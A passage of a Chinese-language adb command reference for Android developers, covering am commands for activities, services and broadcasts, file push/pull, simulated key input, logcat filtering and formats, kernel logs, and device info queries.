<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell pm path &lt;PACKAGE&gt;</span><br></pre></td></tr></table></figure>

<p>输出应用安装路径</p>
<p>输出示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell pm path ecarx.weather</span><br><span class="line"></span><br><span class="line">package:/data/app/ecarx.weather-1.apk</span><br></pre></td></tr></table></figure>

<h2 id="与应用交互"><a href="#与应用交互" class="headerlink" title="与应用交互"></a>与应用交互</h2><p>主要是使用 <code>am &lt;command&gt;</code> 命令，常用的 <code>&lt;command&gt;</code> 如下：</p>
<table>
<thead>
<tr>
<th>command</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>start [options] &lt;INTENT&gt;</code></td>
<td>启动 <code>&lt;INTENT&gt;</code> 指定的 Activity</td>
</tr>
<tr>
<td><code>startservice [options] &lt;INTENT&gt;</code></td>
<td>启动 <code>&lt;INTENT&gt;</code> 指定的 Service</td>
</tr>
<tr>
<td><code>broadcast [options] &lt;INTENT&gt;</code></td>
<td>发送 <code>&lt;INTENT&gt;</code> 指定的广播</td>
</tr>
<tr>
<td><code>force-stop &lt;packagename&gt;</code></td>
<td>停止 <code>&lt;packagename&gt;</code> 相关的进程</td>
</tr>
</tbody></table>
<p><code>&lt;INTENT&gt;</code> 参数很灵活，和写 Android 程序时代码里的 Intent 相对应。</p>
<p>用于决定 intent 对象的选项如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a &lt;ACTION&gt;</code></td>
<td>指定 action，比如 <code>android.intent.action.VIEW</code></td>
</tr>
<tr>
<td><code>-c &lt;CATEGORY&gt;</code></td>
<td>指定 category，比如 <code>android.intent.category.APP_CONTACTS</code></td>
</tr>
<tr>
<td><code>-n &lt;COMPONENT&gt;</code></td>
<td>指定完整 component 名，用于明确指定启动哪个 Activity，如 <code>com.example.app/.ExampleActivity</code></td>
</tr>
</tbody></table>
<p><code>&lt;INTENT&gt;</code> 里还能带数据，就像写代码时的 Bundle 一样：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>--esn &lt;EXTRA_KEY&gt;</code></td>
<td>null 值（只有 key 名）</td>
</tr>
<tr>
<td>&#96;-e</td>
<td>–es <EXTRA_KEY> <EXTRA_STRING_VALUE>&#96;</td>
</tr>
<tr>
<td><code>--ez &lt;EXTRA_KEY&gt; &lt;EXTRA_BOOLEAN_VALUE&gt;</code></td>
<td>boolean 值</td>
</tr>
<tr>
<td><code>--ei &lt;EXTRA_KEY&gt; &lt;EXTRA_INT_VALUE&gt;</code></td>
<td>integer 值</td>
</tr>
<tr>
<td><code>--el &lt;EXTRA_KEY&gt; &lt;EXTRA_LONG_VALUE&gt;</code></td>
<td>long 值</td>
</tr>
<tr>
<td><code>--ef &lt;EXTRA_KEY&gt; &lt;EXTRA_FLOAT_VALUE&gt;</code></td>
<td>float 值</td>
</tr>
<tr>
<td><code>--eu &lt;EXTRA_KEY&gt; &lt;EXTRA_URI_VALUE&gt;</code></td>
<td>URI</td>
</tr>
<tr>
<td><code>--ecn &lt;EXTRA_KEY&gt; &lt;EXTRA_COMPONENT_NAME_VALUE&gt;</code></td>
<td>component name</td>
</tr>
<tr>
<td><code>--eia &lt;EXTRA_KEY&gt; &lt;EXTRA_INT_VALUE&gt;[,&lt;EXTRA_INT_VALUE...]</code></td>
<td>integer 数组</td>
</tr>
<tr>
<td><code>--ela &lt;EXTRA_KEY&gt; &lt;EXTRA_LONG_VALUE&gt;[,&lt;EXTRA_LONG_VALUE...]</code></td>
<td>long 数组</td>
</tr>
</tbody></table>
<h3 id="启动应用-x2F-调起-Activity"><a href="#启动应用-x2F-调起-Activity" class="headerlink" title="启动应用&#x2F; 调起 Activity"></a>启动应用&#x2F; 调起 Activity</h3><blockquote>
<p>指定Activity名称启动</p>
</blockquote>
<p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am start [options] &lt;INTENT&gt;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am start -n com.tencent.mm/.ui.LauncherUI</span><br></pre></td></tr></table></figure>

<p>表示调起微信主界面。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am start -n org.mazhuang.boottimemeasure/.MainActivity --es <span class="string">&quot;toast&quot;</span> <span class="string">&quot;hello, world&quot;</span></span><br></pre></td></tr></table></figure>

<p>表示调起 <code>org.mazhuang.boottimemeasure/.MainActivity</code> 并传给它 string 数据键值对 <code>toast - hello, world</code>。</p>
<blockquote>
<p>不指定Activity名称启动（启动主Activity）</p>
</blockquote>
<p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell monkey -p &lt;packagename&gt; -c android.intent.category.LAUNCHER 1</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell monkey -p com.tencent.mm -c android.intent.category.LAUNCHER 1</span><br></pre></td></tr></table></figure>

<p>表示调起微信主界面。</p>
<h3 id="调起-Service"><a href="#调起-Service" class="headerlink" title="调起 Service"></a>调起 Service</h3><p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am startservice [options] &lt;INTENT&gt;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am startservice -n com.tencent.mm/.plugin.accountsync.model.AccountAuthenticatorService</span><br></pre></td></tr></table></figure>

<p>表示调起微信的某 Service。</p>
<p>另外一个典型的用例是如果设备上原本应该显示虚拟按键但是没有显示，可以试试这个：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am startservice -n com.android.systemui/.SystemUIService</span><br></pre></td></tr></table></figure>

<h3 id="停止-Service"><a href="#停止-Service" class="headerlink" title="停止 Service"></a>停止 Service</h3><p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am stopservice [options] &lt;INTENT&gt;</span><br></pre></td></tr></table></figure>

<h3 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h3><p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast [options] &lt;INTENT&gt;</span><br></pre></td></tr></table></figure>

<p>可以向所有组件广播，也可以只向指定组件广播。</p>
<p>例如，向所有组件广播 <code>BOOT_COMPLETED</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast -a android.intent.action.BOOT_COMPLETED</span><br></pre></td></tr></table></figure>

<p>又例如，只向 <code>org.mazhuang.boottimemeasure/.BootCompletedReceiver</code> 广播 <code>BOOT_COMPLETED</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n org.mazhuang.boottimemeasure/.BootCompletedReceiver</span><br></pre></td></tr></table></figure>

<p>这类用法在测试的时候很实用，比如某个广播的场景很难制造，可以考虑通过这种方式来发送广播。</p>
<p>既能发送系统预定义的广播，也能发送自定义广播。如下是部分系统预定义广播及正常触发时机：</p>
<table>
<thead>
<tr>
<th>action</th>
<th>触发时机</th>
</tr>
</thead>
<tbody><tr>
<td>android.net.conn.CONNECTIVITY_CHANGE</td>
<td>网络连接发生变化</td>
</tr>
<tr>
<td>android.intent.action.SCREEN_ON</td>
<td>屏幕点亮</td>
</tr>
<tr>
<td>android.intent.action.SCREEN_OFF</td>
<td>屏幕熄灭</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_LOW</td>
<td>电量低，会弹出电量低提示框</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_OKAY</td>
<td>电量恢复了</td>
</tr>
<tr>
<td>android.intent.action.BOOT_COMPLETED</td>
<td>设备启动完毕</td>
</tr>
<tr>
<td>android.intent.action.DEVICE_STORAGE_LOW</td>
<td>存储空间过低</td>
</tr>
<tr>
<td>android.intent.action.DEVICE_STORAGE_OK</td>
<td>存储空间恢复</td>
</tr>
<tr>
<td>android.intent.action.PACKAGE_ADDED</td>
<td>安装了新的应用</td>
</tr>
<tr>
<td>android.net.wifi.STATE_CHANGE</td>
<td>WiFi 连接状态发生变化</td>
</tr>
<tr>
<td>android.net.wifi.WIFI_STATE_CHANGED</td>
<td>WiFi 状态变为启用&#x2F;关闭&#x2F;正在启动&#x2F;正在关闭&#x2F;未知</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_CHANGED</td>
<td>电池电量发生变化</td>
</tr>
<tr>
<td>android.intent.action.INPUT_METHOD_CHANGED</td>
<td>系统输入法发生变化</td>
</tr>
<tr>
<td>android.intent.action.ACTION_POWER_CONNECTED</td>
<td>外部电源连接</td>
</tr>
<tr>
<td>android.intent.action.ACTION_POWER_DISCONNECTED</td>
<td>外部电源断开连接</td>
</tr>
<tr>
<td>android.intent.action.DREAMING_STARTED</td>
<td>系统开始休眠</td>
</tr>
<tr>
<td>android.intent.action.DREAMING_STOPPED</td>
<td>系统停止休眠</td>
</tr>
<tr>
<td>android.intent.action.WALLPAPER_CHANGED</td>
<td>壁纸发生变化</td>
</tr>
<tr>
<td>android.intent.action.HEADSET_PLUG</td>
<td>插入耳机</td>
</tr>
<tr>
<td>android.intent.action.MEDIA_UNMOUNTED</td>
<td>卸载外部介质</td>
</tr>
<tr>
<td>android.intent.action.MEDIA_MOUNTED</td>
<td>挂载外部介质</td>
</tr>
<tr>
<td>android.os.action.POWER_SAVE_MODE_CHANGED</td>
<td>省电模式开启</td>
</tr>
</tbody></table>
<p><em>（以上广播均可使用 adb 触发）</em></p>
<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am force-stop &lt;packagename&gt;</span><br></pre></td></tr></table></figure>

<p>命令示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am force-stop com.qihoo360.mobilesafe</span><br></pre></td></tr></table></figure>

<p>表示停止 360 安全卫士的一切进程与服务。</p>
<h3 id="收紧内存"><a href="#收紧内存" class="headerlink" title="收紧内存"></a>收紧内存</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am send-trim-memory  &lt;pid&gt; &lt;level&gt;</span><br></pre></td></tr></table></figure>

<p>pid: 进程 ID<br>level:<br>    HIDDEN、RUNNING_MODERATE、BACKGROUND、<br>    RUNNING_LOW、MODERATE、RUNNING_CRITICAL、COMPLETE</p>
<p>命令示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell am send-trim-memory 12345 RUNNING_LOW</span><br></pre></td></tr></table></figure>

<p>表示向 pid&#x3D;12345 的进程，发出 level&#x3D;RUNNING_LOW 的收紧内存命令。</p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span><br></pre></td></tr></table></figure>

<p>其中 <code>电脑上的目录</code> 参数可以省略，默认复制到当前目录。</p>
<p>例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/sr.mp4 ~/tmp/</span><br></pre></td></tr></table></figure>

<p><em>小技巧：</em>设备上的文件路径可能需要 root 权限才能访问，如果你的设备已经 root 过，可以先使用 <code>adb shell</code> 和 <code>su</code> 命令在 adb shell 里获取 root 权限后，先 <code>cp /path/on/device /sdcard/filename</code> 将文件复制到 sdcard，然后 <code>adb pull /sdcard/filename /path/on/pc</code>。</p>
<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb push ~/sr.mp4 /sdcard/</span><br></pre></td></tr></table></figure>

<p><em>小技巧：</em>设备上的文件路径普通权限可能无法直接写入，如果你的设备已经 root 过，可以先 <code>adb push /path/on/pc /sdcard/filename</code>，然后 <code>adb shell</code> 和 <code>su</code> 在 adb shell 里获取 root 权限后，<code>cp /sdcard/filename /path/on/device</code>。</p>
<h2 id="模拟按键-x2F-输入"><a href="#模拟按键-x2F-输入" class="headerlink" title="模拟按键&#x2F;输入"></a>模拟按键&#x2F;输入</h2><p>在 <code>adb shell</code> 里有个很实用的命令叫 <code>input</code>，通过它可以做一些有趣的事情。</p>
<p><code>input</code> 命令的完整 help 信息如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Usage: input [&lt;<span class="built_in">source</span>&gt;] &lt;<span class="built_in">command</span>&gt; [&lt;arg&gt;...]</span><br><span class="line"></span><br><span class="line">The sources are:</span><br><span class="line">      mouse</span><br><span class="line">      keyboard</span><br><span class="line">      joystick</span><br><span class="line">      touchnavigation</span><br><span class="line">      touchpad</span><br><span class="line">      trackball</span><br><span class="line">      stylus</span><br><span class="line">      dpad</span><br><span class="line">      gesture</span><br><span class="line">      touchscreen</span><br><span class="line">      gamepad</span><br><span class="line"></span><br><span class="line">The commands and default sources are:</span><br><span class="line">      text &lt;string&gt; (Default: touchscreen)</span><br><span class="line">      keyevent [--longpress] &lt;key code number or name&gt; ... (Default: keyboard)</span><br><span class="line">      tap &lt;x&gt; &lt;y&gt; (Default: touchscreen)</span><br><span class="line">      swipe &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; [duration(ms)] (Default: touchscreen)</span><br><span class="line">      press (Default: trackball)</span><br><span class="line">      roll &lt;dx&gt; &lt;dy&gt; (Default: trackball)</span><br></pre></td></tr></table></figure>

<p>比如使用 <code>adb shell input keyevent &lt;keycode&gt;</code> 命令，不同的 keycode 能实现不同的功能，完整的 keycode 列表详见 <a href="https://developer.android.com/reference/android/view/KeyEvent.html">KeyEvent</a>，摘引部分我觉得有意思的如下：</p>
<table>
<thead>
<tr>
<th>keycode</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>3</td>
<td>HOME 键</td>
</tr>
<tr>
<td>4</td>
<td>返回键</td>
</tr>
<tr>
<td>5</td>
<td>打开拨号应用</td>
</tr>
<tr>
<td>6</td>
<td>挂断电话</td>
</tr>
<tr>
<td>24</td>
<td>增加音量</td>
</tr>
<tr>
<td>25</td>
<td>降低音量</td>
</tr>
<tr>
<td>26</td>
<td>电源键</td>
</tr>
<tr>
<td>27</td>
<td>拍照（需要在相机应用里）</td>
</tr>
<tr>
<td>64</td>
<td>打开浏览器</td>
</tr>
<tr>
<td>82</td>
<td>菜单键</td>
</tr>
<tr>
<td>85</td>
<td>播放&#x2F;暂停</td>
</tr>
<tr>
<td>86</td>
<td>停止播放</td>
</tr>
<tr>
<td>87</td>
<td>播放下一首</td>
</tr>
<tr>
<td>88</td>
<td>播放上一首</td>
</tr>
<tr>
<td>122</td>
<td>移动光标到行首或列表顶部</td>
</tr>
<tr>
<td>123</td>
<td>移动光标到行末或列表底部</td>
</tr>
<tr>
<td>126</td>
<td>恢复播放</td>
</tr>
<tr>
<td>127</td>
<td>暂停播放</td>
</tr>
<tr>
<td>164</td>
<td>静音</td>
</tr>
<tr>
<td>176</td>
<td>打开系统设置</td>
</tr>
<tr>
<td>187</td>
<td>切换应用</td>
</tr>
<tr>
<td>207</td>
<td>打开联系人</td>
</tr>
<tr>
<td>208</td>
<td>打开日历</td>
</tr>
<tr>
<td>209</td>
<td>打开音乐</td>
</tr>
<tr>
<td>210</td>
<td>打开计算器</td>
</tr>
<tr>
<td>220</td>
<td>降低屏幕亮度</td>
</tr>
<tr>
<td>221</td>
<td>提高屏幕亮度</td>
</tr>
<tr>
<td>223</td>
<td>系统休眠</td>
</tr>
<tr>
<td>224</td>
<td>点亮屏幕</td>
</tr>
<tr>
<td>231</td>
<td>打开语音助手</td>
</tr>
<tr>
<td>276</td>
<td>如果没有 wakelock 则让系统休眠</td>
</tr>
</tbody></table>
<p>下面是 <code>input</code> 命令的一些用法举例。</p>
<h3 id="电源键"><a href="#电源键" class="headerlink" title="电源键"></a>电源键</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 26</span><br></pre></td></tr></table></figure>

<p>执行效果相当于按电源键。</p>
<h3 id="菜单键"><a href="#菜单键" class="headerlink" title="菜单键"></a>菜单键</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 82</span><br></pre></td></tr></table></figure>

<h3 id="HOME-键"><a href="#HOME-键" class="headerlink" title="HOME 键"></a>HOME 键</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 3</span><br></pre></td></tr></table></figure>

<h3 id="返回键"><a href="#返回键" class="headerlink" title="返回键"></a>返回键</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 4</span><br></pre></td></tr></table></figure>

<h3 id="音量控制"><a href="#音量控制" class="headerlink" title="音量控制"></a>音量控制</h3><p>增加音量：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 24</span><br></pre></td></tr></table></figure>

<p>降低音量：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 25</span><br></pre></td></tr></table></figure>

<p>静音：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 164</span><br></pre></td></tr></table></figure>

<h3 id="媒体控制"><a href="#媒体控制" class="headerlink" title="媒体控制"></a>媒体控制</h3><p>播放&#x2F;暂停：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 85</span><br></pre></td></tr></table></figure>

<p>停止播放：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 86</span><br></pre></td></tr></table></figure>

<p>播放下一首：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 87</span><br></pre></td></tr></table></figure>

<p>播放上一首：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 88</span><br></pre></td></tr></table></figure>

<p>恢复播放：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 126</span><br></pre></td></tr></table></figure>

<p>暂停播放：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 127</span><br></pre></td></tr></table></figure>

<h3 id="点亮-x2F-熄灭屏幕"><a href="#点亮-x2F-熄灭屏幕" class="headerlink" title="点亮&#x2F;熄灭屏幕"></a>点亮&#x2F;熄灭屏幕</h3><p>可以通过上文讲述过的模拟电源键来切换点亮和熄灭屏幕，但如果明确地想要点亮或者熄灭屏幕，那可以使用如下方法。</p>
<p>点亮屏幕：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 224</span><br></pre></td></tr></table></figure>

<p>熄灭屏幕：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input keyevent 223</span><br></pre></td></tr></table></figure>

<h3 id="滑动解锁"><a href="#滑动解锁" class="headerlink" title="滑动解锁"></a>滑动解锁</h3><p>如果锁屏没有密码，是通过滑动手势解锁，那么可以通过 <code>input swipe</code> 来解锁。</p>
<p>命令（参数以机型 Nexus 5，向上滑动手势解锁举例）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input swipe 300 1000 300 500</span><br></pre></td></tr></table></figure>

<p>参数 <code>300 1000 300 500</code> 分别表示<code>起始点x坐标 起始点y坐标 结束点x坐标 结束点y坐标</code>。</p>
<h3 id="输入文本"><a href="#输入文本" class="headerlink" title="输入文本"></a>输入文本</h3><p>在焦点处于某文本框时，可以通过 <code>input</code> 命令来输入文本。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell input text hello</span><br></pre></td></tr></table></figure>

<p>现在 <code>hello</code> 出现在文本框了。</p>
<h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><p>Android 系统的日志分为两部分，底层的 Linux 内核日志输出到 &#x2F;proc&#x2F;kmsg，Android 的日志输出到 &#x2F;dev&#x2F;log。</p>
<h3 id="Android-日志"><a href="#Android-日志" class="headerlink" title="Android 日志"></a>Android 日志</h3><p>命令格式：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[adb] logcat [&lt;option&gt;] ... [&lt;filter-spec&gt;] ...</span><br></pre></td></tr></table></figure>

<p>常用用法列举如下：</p>
<h4 id="按级别过滤日志"><a href="#按级别过滤日志" class="headerlink" title="按级别过滤日志"></a>按级别过滤日志</h4><p>Android 的日志分为如下几个优先级（priority）：</p>
<ul>
<li>V —— Verbose（最低，输出得最多）</li>
<li>D —— Debug</li>
<li>I —— Info</li>
<li>W —— Warning</li>
<li>E —— Error</li>
<li>F —— Fatal</li>
<li>S —— Silent（最高，啥也不输出）</li>
</ul>
<p>按某级别过滤日志则会将该级别及以上的日志输出。</p>
<p>比如，命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb logcat *:W</span><br></pre></td></tr></table></figure>

<p>会将 Warning、Error、Fatal 和 Silent 日志输出。</p>
<p>（<strong>注：</strong> 在 macOS 下需要给 <code>*:W</code> 这样以 <code>*</code> 作为 tag 的参数加双引号，如 <code>adb logcat &quot;*:W&quot;</code>，不然会报错 <code>no matches found: *:W</code>。）</p>
<h4 id="按-tag-和级别过滤日志"><a href="#按-tag-和级别过滤日志" class="headerlink" title="按 tag 和级别过滤日志"></a>按 tag 和级别过滤日志</h4><p><code>&lt;filter-spec&gt;</code> 可以由多个 <code>&lt;tag&gt;[:priority]</code> 组成。</p>
<p>比如，命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb logcat ActivityManager:I MyApp:D *:S</span><br></pre></td></tr></table></figure>

<p>表示输出 tag <code>ActivityManager</code> 的 Info 以上级别日志，输出 tag <code>MyApp</code> 的 Debug 以上级别日志，及其它 tag 的 Silent 级别日志（即屏蔽其它 tag 日志）。</p>
<h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><p>可以用 <code>adb logcat -v &lt;format&gt;</code> 选项指定日志输出格式。</p>
<p>日志支持按以下几种 <code>&lt;format&gt;</code>：</p>
<ul>
<li><p>brief</p>
<p>默认格式。格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;priority&gt;/&lt;tag&gt;(&lt;pid&gt;): &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D/HeadsetStateMachine( 1785): Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>process</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;priority&gt;(&lt;pid&gt;) &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D( 1785) Disconnected process message: 10, size: 0  (HeadsetStateMachine)</span><br></pre></td></tr></table></figure>
</li>
<li><p>tag</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;priority&gt;/&lt;tag&gt;: &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">D/HeadsetStateMachine: Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>raw</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>time</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;datetime&gt; &lt;priority&gt;/&lt;tag&gt;(&lt;pid&gt;): &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">08-28 22:39:39.974 D/HeadsetStateMachine( 1785): Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>threadtime</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;datetime&gt; &lt;pid&gt; &lt;tid&gt; &lt;priority&gt; &lt;tag&gt;: &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">08-28 22:39:39.974  1785  1832 D HeadsetStateMachine: Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure>
</li>
<li><p>long</p>
<p>格式为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ &lt;datetime&gt; &lt;pid&gt;:&lt;tid&gt; &lt;priority&gt;/&lt;tag&gt; ]</span><br><span class="line">&lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ 08-28 22:39:39.974  1785: 1832 D/HeadsetStateMachine ]</span><br><span class="line">Disconnected process message: 10, size: 0</span><br></pre></td></tr></table></figure></li>
</ul>
<p>指定格式可与上面的过滤同时使用。比如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb logcat -v long ActivityManager:I *:S</span><br></pre></td></tr></table></figure>

<h4 id="清空日志"><a href="#清空日志" class="headerlink" title="清空日志"></a>清空日志</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb logcat -c</span><br></pre></td></tr></table></figure>

<h3 id="内核日志"><a href="#内核日志" class="headerlink" title="内核日志"></a>内核日志</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dmesg</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;6&gt;[14201.684016] PM: noirq resume of devices complete after 0.982 msecs</span><br><span class="line">&lt;6&gt;[14201.685525] PM: early resume of devices complete after 0.838 msecs</span><br><span class="line">&lt;6&gt;[14201.753642] PM: resume of devices complete after 68.106 msecs</span><br><span class="line">&lt;4&gt;[14201.755954] Restarting tasks ... <span class="keyword">done</span>.</span><br><span class="line">&lt;6&gt;[14201.771229] PM: <span class="built_in">suspend</span> <span class="built_in">exit</span> 2016-08-28 13:31:32.679217193 UTC</span><br><span class="line">&lt;6&gt;[14201.872373] PM: <span class="built_in">suspend</span> entry 2016-08-28 13:31:32.780363596 UTC</span><br><span class="line">&lt;6&gt;[14201.872498] PM: Syncing filesystems ... <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<p>中括号里的 <code>[14201.684016]</code> 代表内核开始启动后的时间，单位为秒。</p>
<p>通过内核日志我们可以做一些事情，比如衡量内核启动时间，在系统启动完毕后的内核日志里找到 <code>Freeing init memory</code> 那一行前面的时间就是。</p>
<h2 id="查看设备信息"><a href="#查看设备信息" class="headerlink" title="查看设备信息"></a>查看设备信息</h2><h3 id="型号"><a href="#型号" class="headerlink" title="型号"></a>型号</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.model</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Nexus 5</span><br></pre></td></tr></table></figure>

<h3 id="电池状况"><a href="#电池状况" class="headerlink" title="电池状况"></a>电池状况</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell dumpsys battery</span><br></pre></td></tr></table></figure>

<p>输入示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Current Battery Service state:</span><br><span class="line">  AC powered: <span class="literal">false</span></span><br><span class="line">  USB powered: <span class="literal">true</span></span><br><span class="line">  Wireless powered: <span class="literal">false</span></span><br><span class="line">  status: 2</span><br><span class="line">  health: 2</span><br><span class="line">  present: <span class="literal">true</span></span><br><span class="line">  level: 44</span><br><span class="line">  scale: 100</span><br><span class="line">  voltage: 3872</span><br><span class="line">  temperature: 280</span><br><span class="line">  technology: Li-poly</span><br></pre></td></tr></table></figure>

<p>其中 <code>scale</code> 代表最大电量，<code>level</code> 代表当前电量。上面的输出表示还剩下 44% 的电量。</p>
<h3 id="屏幕分辨率"><a href="#屏幕分辨率" class="headerlink" title="屏幕分辨率"></a>屏幕分辨率</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb shell wm size</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Physical size: 1080x1920</span><br></pre></td></tr></table></figure>

<p>该设备屏幕分辨率为 1080px * 1920px。</p>
